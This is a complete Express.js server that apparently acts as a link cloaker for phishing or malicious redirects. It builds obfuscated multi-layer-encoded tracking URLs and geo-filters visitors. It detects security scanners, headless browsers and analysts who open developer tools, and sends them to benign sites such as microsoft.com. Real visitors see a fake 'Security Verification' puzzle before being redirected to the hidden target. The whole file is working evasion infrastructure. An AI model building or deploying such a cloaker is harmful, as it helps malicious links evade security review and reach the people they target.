const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch'); // npm install node-fetch@2

const app = express();

app.set('trust proxy', 1);

// ────────────────────────────────────────────────
// CONFIGURATION
// ────────────────────────────────────────────────
const TARGET_URL = process.env.TARGET_URL || 'https://www.microsoft.com';

const BOT_URLS = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.google.com',
  'https://www.bbc.com',
  'https://www.youtube.com'
];

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const GEO_API_URL = process.env.GEO_API_URL || 'https://ipapi.co/{ip}/country/';

const LOG_FILE = 'clicks.log';
const PORT = process.env.PORT || 3000;

// ────────────────────────────────────────────────
// CSP – strict, no external resources
// ────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameSrc:   ["'self'"],
    },
  },
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health endpoints
app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));

// ────────────────────────────────────────────────
// BOT DETECTION – VERY STRONG (server-side)
// ────────────────────────────────────────────────
const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 4,
  message: 'Rate limit exceeded',
  standardHeaders: true,
  legacyHeaders: false,
});

const suspiciousUA = [
  /headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i,
  /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i,
  /zoomeye/i, /nmap/i, /gobuster/i
];

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const ref = (req.headers['referer'] || '').toLowerCase();
  const accept = req.headers['accept'] || '';

  let score = 0;

  // Basic UA & header signals
  if (suspiciousUA.some(r => r.test(ua))) score += 35;
  if (!ua.includes('mozilla')) score += 18;
  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 15;
  if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 12;
  if (!accept.includes('text/html')) score += 12;

  // Missing modern browser security headers (very common in bots 2025–2026)
  if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) {
    score += 22;
  }
  if (!req.headers['sec-fetch-dest'] || !req.headers['sec-fetch-mode'] || !req.headers['sec-fetch-site']) {
    score += 25;
  }
  if (!req.headers['upgrade-insecure-requests']) score += 14;

  // Suspicious header patterns
  if (!req.headers['accept-language'] || req.headers['accept-language'].length < 5) score += 16;
  if (Object.keys(req.headers).length < 10) score += 18;

  // Alphabetical header sorting (many simple bots sort headers)
  const headerKeys = Object.keys(req.headers);
  const sortedKeys = [...headerKeys].sort();
  if (headerKeys.join() === sortedKeys.join()) score += 20;

  console.log(`[BOT CHECK SERVER] ${req.ip} | Score: ${score} | UA: ${ua.substring(0,80)}...`);

  return score >= 65;
}

// ────────────────────────────────────────────────
// GEO LOCATION CHECK
// ────────────────────────────────────────────────
async function getCountryCode(req) {
  if (req.headers['cf-ipcountry']) return req.headers['cf-ipcountry'].toUpperCase();

  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1')) return 'XX';

  try {
    const res = await fetch(GEO_API_URL.replace('{ip}', ip), { timeout: 3000 });
    if (res.ok) return (await res.text()).trim().toUpperCase();
  } catch (err) {
    console.log(`[GEO FAIL] ${ip} | ${err.message}`);
  }
  return 'XX';
}

// ────────────────────────────────────────────────
// MULTI-LAYER URL ENCODING / DECODING
// ────────────────────────────────────────────────
const encoders = [
  { name: 'base64',     enc: s => Buffer.from(s).toString('base64'),     dec: s => Buffer.from(s, 'base64').toString() },
  { name: 'base64url',  enc: s => Buffer.from(s).toString('base64url'),  dec: s => Buffer.from(s, 'base64url').toString() },
  { name: 'rot13',      enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) - 13) ? c : c + 26)) },
  { name: 'hex',        enc: s => Buffer.from(s).toString('hex'),        dec: s => Buffer.from(s, 'hex').toString() },
  { name: 'urlencode',  enc: encodeURIComponent,                         dec: decodeURIComponent },
];

function multiLayerEncode(str) {
  let result = str;
  const layers = [];
  const noise = crypto.randomBytes(6 + Math.floor(Math.random() * 10)).toString('hex');
  result = noise + result + noise;

  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
  const selected = shuffled.slice(0, 4 + Math.floor(Math.random() * 2));

  for (const layer of selected) {
    result = layer.enc(result);
    layers.push(layer.name);
  }

  result = encodeURIComponent(result);
  result = encodeURIComponent(result);
  result = encodeURIComponent(result);

  return { encoded: result, layers: layers.reverse(), noise };
}

function multiLayerDecode(encoded, layers, noise) {
  let result = encoded;
  result = decodeURIComponent(result);
  result = decodeURIComponent(result);
  result = decodeURIComponent(result);

  for (const layerName of layers) {
    const layer = encoders.find(e => e.name === layerName);
    if (!layer) throw new Error(`Unknown layer: ${layerName}`);
    result = layer.dec(result);
  }

  if (noise && result.startsWith(noise) && result.endsWith(noise)) {
    result = result.slice(noise.length, -noise.length);
  }

  return result;
}

// ────────────────────────────────────────────────
// GENERATE TRACKING LINK
// ────────────────────────────────────────────────
app.get('/generate', (req, res) => {
  const target = req.query.target || TARGET_URL;
  const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();

  const { encoded, layers, noise } = multiLayerEncode(noisy);
  const layersEnc = Buffer.from(JSON.stringify({ layers, noise })).toString('base64url');

  const segments = [];
  for (let i = 0; i < 6; i++) {
    segments.push(crypto.randomBytes(8).toString('hex') + Math.random().toString(36).substring(2, 12).toUpperCase() + (i % 2 ? 'verify' : 'session'));
  }

  const path = `/r/${segments.join('/')}/${crypto.randomBytes(12).toString('hex')}`;

  const params = [];
  const keys = ['sid','tok','ref','utm_src','clid','ver','ts','hmac','nonce','_t','cid','fid','l'];
  for (let i = 0; i < 13; i++) {
    const k = keys[i % keys.length] + (i > 6 ? '_' + (i + 1) : '');
    const v = k.startsWith('l') ? layersEnc : encodeURIComponent(crypto.randomBytes(12).toString('base64url'));
    params.push(`${k}=${v}`);
  }

  const url = `https://${req.hostname}${path}?p=${encoded}&${params.join('&')}&v=7.3.${Math.floor(Math.random()*100)}`;

  console.log(`[GENERATED] ${url.length} chars → ${target}`);
  res.json({ success: true, tracked: url });
});

// ────────────────────────────────────────────────
// MAIN ROUTE /r/*  – NEUTRAL PAGE + VERY STRONG BOT DETECTION
// ────────────────────────────────────────────────
app.get('/r/*', strictLimiter, async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';

  const country = await getCountryCode(req);

  let geoAllowed = true;
  if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
  if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;

  if (!geoAllowed || isLikelyBot(req)) {
    const reason = !geoAllowed ? 'GEO_BLOCKED' : 'BOT_BLOCK';
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${reason} ${ip} ${country}\n`, () => {});
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${ip} ${country} ${ua}\n`, () => {});

  // Decode target URL from query params
  let redirectTarget = TARGET_URL;
  try {
    const query = req.url.split('?')[1] || '';
    const params = new URLSearchParams(query);
    const enc = params.get('p') || '';
    const layersB64 = params.get('l') || '';

    if (enc && layersB64) {
      const { layers, noise } = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
      let decoded = multiLayerDecode(enc, layers, noise);

      const hashIdx = decoded.indexOf('#');
      if (hashIdx !== -1) decoded = decoded.substring(0, hashIdx);

      if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;

      const urlObj = new URL(decoded);
      if (['http:', 'https:'].includes(urlObj.protocol)) {
        redirectTarget = decoded;
      }
    }
  } catch (err) {
    console.error(`DECODE_ERROR ${ip} | ${err.message}`);
  }

  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");

  // ────────────────────────────────────────────────
  // NEUTRAL VERIFICATION PAGE + AGGRESSIVE CLIENT-SIDE BOT DETECTION
  // ────────────────────────────────────────────────
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification</title>
  <style>
    body {
      font-family: system-ui, -apple-system, sans-serif;
      background: #f5f5f5;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #222;
    }
    .box {
      background: white;
      padding: 44px 36px;
      border-radius: 12px;
      box-shadow: 0 6px 24px rgba(0,0,0,0.08);
      text-align: center;
      max-width: 440px;
      width: 92%;
    }
    .loader {
      border: 5px solid #eee;
      border-top: 5px solid #4a90e2;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1.1s linear infinite;
      margin: 0 auto 28px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    h2 {
      margin: 0 0 16px;
      font-size: 1.65rem;
      font-weight: 600;
    }
    p {
      margin: 0 0 24px;
      color: #555;
      line-height: 1.45;
    }
    #canvas-container {
      position: relative;
      margin: 28px auto;
      width: 320px;
      height: 200px;
      border: 1px solid #ddd;
      border-radius: 8px;
      overflow: hidden;
      background: #fafafa;
    }
    canvas { position: absolute; top: 0; left: 0; }
    #slider {
      width: 100%;
      height: 56px;
      margin: 28px 0 16px;
      background: #f0f0f0;
      border-radius: 28px;
      position: relative;
      cursor: grab;
    }
    #slider-knob {
      position: absolute;
      top: 8px;
      left: 8px;
      width: 40px;
      height: 40px;
      background: #4a90e2;
      border-radius: 50%;
      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
      transition: left 0.12s;
    }
    #instructions {
      font-size: 1rem;
      color: #444;
      margin-bottom: 20px;
    }
    #error-msg {
      color: #d32f2f;
      margin-top: 16px;
      font-size: 0.95rem;
      display: none;
    }
    #loading {
      position: absolute;
      inset: 0;
      background: rgba(255,255,255,0.95);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 10;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Security Verification</h2>
    <p>This quick check helps us confirm you're not automated.</p>

    <div id="loading">
      <div class="loader"></div>
      <p>Preparing verification...</p>
    </div>

    <div id="content" style="display:none;">
      <div id="instructions">Slide the piece into place</div>
      <div id="canvas-container">
        <canvas id="bgCanvas" width="320" height="200"></canvas>
        <canvas id="pieceCanvas" width="320" height="200"></canvas>
      </div>

      <div id="slider">
        <div id="slider-knob"></div>
      </div>

      <div id="error-msg"></div>
    </div>
  </div>

  <script nonce="${res.locals.nonce}">
    const TARGET_URL = '${safeTarget}';
    const BOT_URL    = '${BOT_URLS[0]}';

    // ─── VERY STRONG CLIENT-SIDE BOT / HEADLESS / AUTOMATION DETECTION ───

    // 1. Classic headless & automation fingerprints
    if (
      navigator.webdriver ||
      window.outerWidth === 0 ||
      window.outerHeight === 0 ||
      navigator.plugins.length === 0 ||
      navigator.languages.length === 0 ||
      navigator.hardwareConcurrency === undefined ||
      navigator.deviceMemory === undefined ||
      !navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari') ||
      (navigator.userAgentData && !navigator.userAgentData.platform) ||
      navigator.maxTouchPoints === undefined
    ) {
      location.href = BOT_URL;
    }

    // 2. Incomplete or missing Chrome object (very common in headless Chrome 2025–2026)
    if (window.chrome === undefined || !window.chrome.runtime || !window.chrome.loadTimes || !window.chrome.csi) {
      location.href = BOT_URL;
    }

    // 3. Canvas fingerprint – detect known bot / headless signatures
    const testCanvas = document.createElement('canvas');
    const ctx = testCanvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Hello, world!', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Hello, world!', 4, 17);

    const canvasData = testCanvas.toDataURL();

    // Known bot / headless canvas patterns (partial – expand during testing)
    const botCanvasPatterns = [
      'iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAYAAAB5fY51',
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ',
      'AAAAAElFTkSuQmCC'
    ];

    if (botCanvasPatterns.some(p => canvasData.includes(p))) {
      location.href = BOT_URL;
    }

    // 4. DevTools / inspector detection (many analysts open dev tools)
    const devtoolsTrap = /./;
    devtoolsTrap.toString = function() {
      entropy -= 40; // heavy penalty
      return 'devtools detected';
    };
    console.log('%c', devtoolsTrap);

    // 5. Unrealistically fast or perfectly linear mouse/touch movement
    let lastMoveTime = 0;
    document.addEventListener('mousemove', e => {
      const now = Date.now();
      if (now - lastMoveTime < 5) { // too fast for human
        entropy -= 15;
      }
      lastMoveTime = now;
    }, {passive: true});

    // ─── Behavioral tracking (tightened for better human vs bot separation) ───
    let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
    let focusLost = 0;

    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    const minMoves   = mobile ? 6 : 9;
    const minEntropy = mobile ? 18 : 30;

    function updateEntropy(dx, dy) {
      const now = Date.now();
      const dt = (now - lastTime) / 1000 || 1;
      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.8;
      lastTime = now;
      moves++;
    }

    document.addEventListener('mousemove', e => {
      if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY));
      lastX = e.clientX; lastY = e.clientY;
    });

    document.addEventListener('touchmove', e => {
      if (e.touches?.length) {
        const t = e.touches[0];
        if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY));
        lastX = t.clientX; lastY = t.clientY;
      }
    }, {passive:true});

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) focusLost++;
    });

    // ─── Neutral puzzle logic ───
    const bg = document.getElementById('bgCanvas').getContext('2d');
    const piece = document.getElementById('pieceCanvas').getContext('2d');
    const knob = document.getElementById('slider-knob');

    let puzzleX = 0, targetX = 0, pieceSize = 64;

    function generatePuzzle() {
      targetX = 50 + Math.random() * 200;
      puzzleX = 0;

      const grad = bg.createLinearGradient(0,0,320,200);
      grad.addColorStop(0, '#f8f9fa');
      grad.addColorStop(1, '#e9ecef');
      bg.fillStyle = grad; bg.fillRect(0,0,320,200);

      bg.fillStyle = '#4a90e2'; bg.fillRect(30, 50, 260, 100);
      bg.font = 'bold 32px system-ui, sans-serif';
      bg.fillStyle = '#ffffff'; bg.fillText('Secure', 100, 110);

      redrawPiece();
    }

    function redrawPiece() {
      piece.clearRect(0,0,320,200);
      piece.save();
      piece.beginPath();
      piece.moveTo(puzzleX, 70);
      piece.lineTo(puzzleX + pieceSize, 70);
      piece.lineTo(puzzleX + pieceSize, 134);
      piece.lineTo(puzzleX, 134);
      piece.closePath();
      piece.clip();
      piece.drawImage(document.getElementById('bgCanvas'), puzzleX, 70, pieceSize, 64, puzzleX, 70, pieceSize, 64);
      piece.shadowColor = 'rgba(0,0,0,0.3)'; piece.shadowBlur = 10;
      piece.strokeStyle = '#999'; piece.lineWidth = 2.5;
      piece.strokeRect(puzzleX, 70, pieceSize, 64);
      piece.restore();
    }

    let dragging = false, startX = 0;

    knob.addEventListener('mousedown', e => { dragging = true; startX = e.clientX - puzzleX; e.preventDefault(); });
    document.addEventListener('mousemove', e => {
      if (!dragging) return;
      puzzleX = Math.max(0, Math.min(280, e.clientX - startX));
      knob.style.left = puzzleX + 'px';
      redrawPiece();
    });
    document.addEventListener('mouseup', () => { dragging = false; checkSolve(); });

    knob.addEventListener('touchstart', e => { dragging = true; startX = e.touches[0].clientX - puzzleX; e.preventDefault(); });
    document.addEventListener('touchmove', e => {
      if (!dragging) return;
      puzzleX = Math.max(0, Math.min(280, e.touches[0].clientX - startX));
      knob.style.left = puzzleX + 'px';
      redrawPiece();
    }, {passive:false});
    document.addEventListener('touchend', () => { dragging = false; checkSolve(); });

    function checkSolve() {
      const dist = Math.abs(puzzleX - targetX);
      if (dist < 10 && moves >= minMoves && entropy >= minEntropy && focusLost <= 2) {
        setTimeout(() => location.href = TARGET_URL, 900 + Math.random()*1400);
      } else if (dist < 10) {
        const err = document.getElementById('error-msg');
        err.textContent = 'Please complete the verification step.';
        err.style.display = 'block';
        setTimeout(() => { err.style.display = 'none'; generatePuzzle(); }, 2200);
      }
    }

    // Show puzzle after fake human-like delay
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('content').style.display = 'block';
      generatePuzzle();
    }, 2200 + Math.random() * 1800);

    // Hard timeout – fail if user takes too long
    setTimeout(() => location.href = BOT_URL, 45000);
  </script>
</body>
</html>
  `);
});

// Catch-all – redirect to random benign page
app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
